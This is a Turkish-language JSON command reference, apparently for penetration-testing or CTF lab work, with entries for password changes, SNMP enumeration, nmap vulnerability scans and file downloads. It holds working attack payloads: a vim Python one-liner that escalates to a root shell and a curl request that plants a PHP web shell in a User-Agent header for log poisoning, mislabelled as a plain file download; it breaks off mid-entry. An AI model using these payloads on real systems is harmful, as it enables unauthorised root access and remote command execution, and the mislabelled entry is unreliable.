{
    "chpasswd": {
        "desc": "Sistem kullanıcısı parolasını değiştirme",
        "command": "echo 'aurora:passwd' | chpasswd",
        "usage": "Linux sisteminde kullanıcı parolasını değiştirmek için",
        "examples": [
            "echo 'aurora:passwd' | chpasswd",
            "echo 'user:passwd' | sudo chpasswd"
        ],
        "category": "user_management",
        "permissions": "root_required"
    },
    "snmpwalk": {
        "desc": "SNMP kullanarak ağ cihazlarından bilgi toplama",
        "command": "snmpwalk -v 2c -c public alexriveraexplorer.hv NET-SNMP-EXTEND-MIB::nsExtendOutputFull",
        "usage": "Belirtilen SNMP cihazından NET-SNMP-EXTEND-MIB::nsExtendOutputFull değerini okumak için",
        "examples": [
            "snmpwalk -v 2c -c public alexriveraexplorer.hv NET-SNMP-EXTEND-MIB::nsExtendOutputFull"
        ],
        "category": "network_management",
        "permissions": "read_access"
    },
    "passwd": {
        "desc": "Kullanıcı parolasını interaktif değiştirme",
        "command": "echo newpw | passwd aurora",
        "usage": "Belirtilen kullanıcının parolasını değiştirmek için",
        "category": "user_management",
        "type": "credential_modification"
    },
    "vim_privilege_escalation": {
        "desc": "Vim ile privilege escalation",
        "command": "vim -c ':python3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "usage": "Vim python desteği kullanarak root yetkisi elde etmek için",
        "category": "privilege_escalation",
        "type": "binary_exploitation",
        "security": "high_risk",
        "requirements": "vim python3 support"
    },
    "nmap_vuln_scan": {
        "desc": "Nmap ile zafiyet taraması",
        "command": "nmap -sV --script vuln cipherstorm.hv",
        "usage": "Hedef sistemde bilinen zafiyetleri taramak için",
        "category": "reconnaissance",
        "type": "vulnerability_scanning",
        "flags": {
            "-sV": "Servis versiyonu tespiti",
            "--script vuln": "Zafiyet tarama scriptleri"
        }
    },

    "curl_download": {
        "desc": "Curl ile dosya indirme",
        "commands": [
            "curl -O -L 'http://10.8.19.24:8000/prev.sh'",
            "curl -X GET -H \"Referer: <WebsiteSubdir>\" -H \"User-Agent: <?php system($_GET['cmd']); ?>\" -H \"Content-Type: */*\" -b \"PHPSESSID=q2rvsbb6drdb9qcqqvrnhirngt\" <WebSite>"
        ],
        "usage": "Uzak sunucudan dosya indirmek için",
        "category": "file_transfer",
        "flags": {
            "-O": "Dosyayı orijinal adıyla kaydet",
            "-L": "Yönlendirmeleri takip et",
            "-X": "HTTP isteği türünü belirt (GET, POST, vb.)",
            "-H": "HTTP başlıklarını ekle",
            "-b": "Çerezleri gönder"
        }
    },
    "tar_backup": {
        "desc": "Tar ile dosya arşivleme",
        "command": ["tar -xvf {archive} {file_name}", "tar -xvf file.tar foo.txt", "tar -xzvf file.tar.gz foo.txt", "tar -xjvf file.tar.bz2 foo.txt"],
        "usage": "Belirtilen dizinleri sıkıştırılmış arşiv haline getirmek için",
